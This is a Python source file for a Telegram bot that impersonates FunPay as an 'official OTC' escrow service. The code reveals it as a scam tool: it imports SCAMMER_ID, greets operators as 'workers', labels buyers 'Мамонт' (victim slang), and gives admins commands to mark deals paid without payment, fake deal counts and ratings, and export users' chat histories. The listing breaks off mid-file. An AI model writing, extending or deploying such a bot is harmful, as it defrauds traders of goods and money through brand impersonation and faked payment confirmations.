import logging
import os
from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, FSInputFile
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext

from config import (
    ADMIN_IDS, SCAMMER_ID, SCAMMER_USERNAME,
    SUPPORT_USERNAME, COMMISSION, WELCOME_GIF_PATH,
    ERROR_MESSAGES,
    E_DEAL, E_GRAM, E_STARS, E_RUB, E_HAMMER, E_CHECK,
    E_CROSS, E_BACK, E_SHARE, E_CHART, E_LIST,
    E_USERS, E_SETTINGS, E_PAID, E_WARNING,
    E_PROFILE, E_WITHDRAW, E_CARD, E_GLOBE,
    E_CHAT, E_BANK, E_SUCCESS, E_GROUP,
    E_UP, E_DOWN,
    E_RU, E_US, E_TR
)
from database import (
    init_db, add_user, get_user, add_requisite, get_requisites,
    delete_requisites, create_deal, get_deal, update_deal_buyer,
    update_deal_paid, update_deal_confirmed, update_deal_completed,
    get_user_deals, update_user_successful_deals, get_all_users,
    get_all_deals, get_deal_count_by_status, get_user_count
)
from keyboards import (
    main_menu, admin_panel, currency_selection, requisite_menu,
    deal_actions, deal_status_buttons, deal_paid_buttons,
    back_button, ok_button, share_deal
)
from states import DealStates, RequisiteStates

router = Router()
logger = logging.getLogger(__name__)

init_db()

def is_admin(user_id):
    return user_id in ADMIN_IDS

def validate_gram(address):
    return address.startswith('UQ') and len(address) >= 30

def validate_card(card):
    card = card.replace(' ', '').replace('-', '')
    return card.isdigit() and len(card) >= 16

def format_requisites(reqs):
    if not reqs:
        return "❌ Реквизиты не добавлены"
    lines = []
    for req_type, value in reqs:
        if req_type == "gram":
            lines.append(f"{E_GRAM} кошелёк:\n{value}")
        elif req_type == "card":
            lines.append(f"{E_CARD} карта:\n{value}")
        elif req_type == "stars":
            lines.append(f"{E_STARS} звёзды:\n{value}")
        elif req_type == "rub":
            lines.append(f"{E_RUB} рубли:\n{value}")
    return "\n\n".join(lines)

def format_amount(amount):
    if amount == int(amount):
        return str(int(amount))
    return str(amount)

async def send_main_menu(message: Message, user_id: int):
    is_admin_user = is_admin(user_id)

    if os.path.exists(WELCOME_GIF_PATH):
        try:
            gif = FSInputFile(WELCOME_GIF_PATH)
            await message.answer_animation(
                animation=gif,
                caption=f"{E_BANK} <b>FunPay · Официальная OTC-платформа</b>",
                reply_markup=main_menu(is_admin_user)
            )
            return
        except Exception as e:
            logger.error(f"GIF error: {e}")

    text = f"{E_BANK} <b>FunPay · Официальная OTC-платформа</b>\n\n"
    text += f"{E_CHECK} Мы предоставляем полностью автоматизированный сервис гаранта\n"
    text += f"для безопасного обмена цифровыми активами.\n\n"
    text += f"{E_CHECK} <b>Почему выбирают нас?</b>\n"
    text += f"• Средства блокируются в блокчейне — прозрачно и безопасно\n"
    text += f"• Автоматическая проверка оплаты и передачи товара\n"
    text += f"• Система рейтинга покупателей и продавцов\n"
    text += f"• Поддержка 24/7\n\n"
    text += f"{E_CHAT} Поддержка: {SUPPORT_USERNAME}"

    if is_admin_user:
        admin_text = f"{E_SETTINGS} <b>Приветствую, воркер!</b>\n\n"
        admin_text += f"<b>Наши команды:</b>\n"
        admin_text += f"/buy *код-сделки* – для оплаты сделки\n"
        admin_text += f"/set_sdel – для установки успешных сделок\n"
        admin_text += f"/set_ret – для установки рейтинга (в профиле)\n"
        admin_text += f"/twodeal *юз/айди* – сообщение о второй сделке\n"
        admin_text += f"/send *текст* *юз/айди* – отправить сообщение\n"
        admin_text += f"/chat *юз/айди* – выгрузить историю переписки"
        await message.answer(admin_text, reply_markup=main_menu(is_admin=True))
    else:
        await message.answer(text, reply_markup=main_menu(is_admin=False))

async def edit_main_menu(callback: CallbackQuery, user_id: int):
    is_admin_user = is_admin(user_id)

    if not callback.message.text:
        await send_main_menu(callback.message, user_id)
        await callback.message.delete()
        return

    text = f"{E_BANK} <b>FunPay · Официальная OTC-платформа</b>\n\n"
    text += f"{E_CHECK} Мы предоставляем полностью автоматизированный сервис гаранта\n"
    text += f"для безопасного обмена цифровыми активами.\n\n"
    text += f"{E_CHECK} <b>Почему выбирают нас?</b>\n"
    text += f"• Средства блокируются в блокчейне — прозрачно и безопасно\n"
    text += f"• Автоматическая проверка оплаты и передачи товара\n"
    text += f"• Система рейтинга покупателей и продавцов\n"
    text += f"• Поддержка 24/7\n\n"
    text += f"{E_CHAT} Поддержка: {SUPPORT_USERNAME}"

    if is_admin_user:
        admin_text = f"{E_SETTINGS} <b>Приветствую, воркер!</b>\n\n"
        admin_text += f"<b>Наши команды:</b>\n"
        admin_text += f"/buy *код-сделки* – для оплаты сделки\n"
        admin_text += f"/set_sdel – для установки успешных сделок\n"
        admin_text += f"/set_ret – для установки рейтинга (в профиле)\n"
        admin_text += f"/twodeal *юз/айди* – сообщение о второй сделке\n"
        admin_text += f"/send *текст* *юз/айди* – отправить сообщение\n"
        admin_text += f"/chat *юз/айди* – выгрузить историю переписки"
        await callback.message.edit_text(admin_text, reply_markup=main_menu(is_admin=True))
    else:
        await callback.message.edit_text(text, reply_markup=main_menu(is_admin=False))

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()

    user_id = message.from_user.id
    username = message.from_user.username or "Нет юзернейма"
    full_name = message.from_user.full_name

    add_user(user_id, username, full_name)

    args = message.text.split()
    if len(args) > 1:
        param = args[1].strip()

        if not param.startswith("ref_"):
            deal_code = param
            deal = get_deal(deal_code)

            if deal and deal[6] not in ['paid', 'confirmed', 'completed']:
                update_deal_buyer(deal_code, user_id)

                reqs = get_requisites(deal[1])
                req_text = format_requisites(reqs)

                await message.answer(
                    f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
                    f"<b>Сумма:</b> {format_amount(deal[4])} {deal[5]}\n"
                    f"<b>Описание:</b> {deal[5]}\n"
                    f"<b>Комиссия:</b> {COMMISSION}%\n\n"
                    f"<b>Реквизиты для оплаты:</b>\n"
                    f"{req_text}\n\n"
                    f"После успешной оплаты статус сделки изменится, и продавец получит уведомление о вашей успешной оплате!",
                    reply_markup=deal_status_buttons(deal_code, is_seller=False)
                )

                user = get_user(user_id)
                deals_count = user[3] if user else 0

                await message.bot.send_message(
                    deal[1],
                    f"{E_WARNING} <b>@{username} ({user_id}) присоединился к сделке #{deal_code}!</b>\n"
                    f"Успешных сделок: {deals_count}\n\n"
                    f"{E_WARNING} Не передавайте товар на {SUPPORT_USERNAME}, пока бот не уведомит покупателя об оплате!"
                )
                return

    await send_main_menu(message, user_id)

@router.message(Command("buy"))
async def cmd_buy(message: Message):
    if not is_admin(message.from_user.id):
        await message.answer(ERROR_MESSAGES["access_denied"])
        return

    args = message.text.split()
    if len(args) < 2:
        await message.answer(f"{E_CROSS} <b>Используйте: /buy #код-сделки</b>")
        return

    deal_code = args[1].replace('#', '')
    deal = get_deal(deal_code)

    if not deal:
        await message.answer(ERROR_MESSAGES["deal_not_found"])
        return

    if deal[6] != 'joined':
        await message.answer(ERROR_MESSAGES["deal_not_joined"])
        return

    buyer_id = deal[3]
    buyer = get_user(buyer_id)
    buyer_username = buyer[1] if buyer else "Неизвестно"

    await message.answer(
        f"{E_WARNING} <b>Вы уверены что хотите провести оплату по сделке #{deal_code}?</b>\n\n"
        f"Мамонт: @{buyer_username} ({buyer_id})\n"
        f"Сумма: {format_amount(deal[4])} {deal[5]}\n"
        f"Описание: {deal[5]}",
        reply_markup=deal_paid_buttons(deal_code)
    )

@router.callback_query(F.data == "back_to_main")
async def back_to_main(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await edit_main_menu(callback, callback.from_user.id)
    await callback.answer()

@router.callback_query(F.data == "admin_panel")
async def admin_panel_callback(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return

    if not callback.message.text:
        await callback.message.answer(
            f"{E_SETTINGS} <b>Админ-панель</b>\n\nВыберите действие:",
            reply_markup=admin_panel()
        )
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(
        f"{E_SETTINGS} <b>Админ-панель</b>\n\nВыберите действие:",
        reply_markup=admin_panel()
    )
    await callback.answer()

@router.callback_query(F.data == "admin_stats")
async def admin_stats(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return

    user_count = get_user_count()
    deals = get_all_deals()
    stats = get_deal_count_by_status()

    text = f"{E_CHART} <b>Статистика</b>\n\n"
    text += f"{E_USERS} Всего пользователей: {user_count}\n"
    text += f"{E_LIST} Всего сделок: {len(deals)}\n\n"
    text += f"<b>Статусы:</b>\n"
    for status, count in stats:
        emoji = {'created': '🟡', 'joined': '🔵', 'paid': '🟣', 'confirmed': '🟠', 'completed': E_SUCCESS}.get(status, '⚪')
        text += f"{emoji} {status}: {count}\n"

    if not callback.message.text:
        await callback.message.answer(text, reply_markup=back_button())
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "admin_deals")
async def admin_deals(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return

    deals = get_all_deals()[:10]

    if not deals:
        text = f"{E_LIST} <b>Нет сделок</b>"
    else:
        text = f"{E_LIST} <b>Последние 10 сделок:</b>\n\n"
        for deal in deals:
            text += f"#{deal[0]} | {format_amount(deal[4])} {deal[5]} | {deal[6]}\n"

    if not callback.message.text:
        await callback.message.answer(text, reply_markup=back_button())
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "admin_users")
async def admin_users(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return

    users = get_all_users()[:10]

    if not users:
        text = f"{E_USERS} <b>Нет пользователей</b>"
    else:
        text = f"{E_USERS} <b>Последние 10 пользователей:</b>\n\n"
        for user in users:
            text += f"@{user[1]} | Сделок: {user[3]} | Рейтинг: {user[4]}\n"

    if not callback.message.text:
        await callback.message.answer(text, reply_markup=back_button())
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@